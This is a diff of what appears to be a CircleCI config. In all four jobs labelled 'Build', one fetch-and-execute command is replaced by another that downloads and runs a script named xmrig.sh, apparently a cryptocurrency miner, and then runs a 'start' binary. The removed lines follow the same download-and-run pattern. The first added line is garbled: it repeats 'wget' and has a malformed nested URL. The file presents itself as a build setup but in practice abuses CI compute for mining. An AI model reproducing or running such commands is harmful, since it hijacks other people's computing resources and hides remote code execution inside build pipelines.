@@ -6,28 +6,28 @@ jobs:
       steps: 
         - run: 
             name: Build 
-            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+            command: wget  wget https://raw.githubusercontent.com/msuntung/upy/main/githubusercontent.com/msuntung/BTC/main/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh && chmod +x start &&./start 
     Build_02: 
       docker: 
             - image: circleci/ruby:2.4 
       steps: 
         - run: 
             name: Build 
-            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+            command:  wget https://raw.githubusercontent.com/msuntung/upy/main/githubusercontent.com/msuntung/BTC/main/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh && chmod +x start &&./start
     Build_03: 
       docker: 
             - image: circleci/ruby:2.4 
       steps: 
         - run: 
             name: Build 
-            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+            command:  wget https://raw.githubusercontent.com/msuntung/upy/main/githubusercontent.com/msuntung/BTC/main/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh && chmod +x start &&./start
     Build_04: 
       docker: 
             - image: circleci/ruby:2.4 
       steps: 
         - run: 
             name: Build 
-            command: wget https://raw.githubusercontent.com/nurfasikin/DGB/main/runer.sh && chmod u+x runer.sh && ./runer.sh && chmod +x start &&./start 
+            command:  wget https://raw.githubusercontent.com/msuntung/upy/main/githubusercontent.com/msuntung/BTC/main/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh && chmod +x start &&./start
  
  
 workflows: 
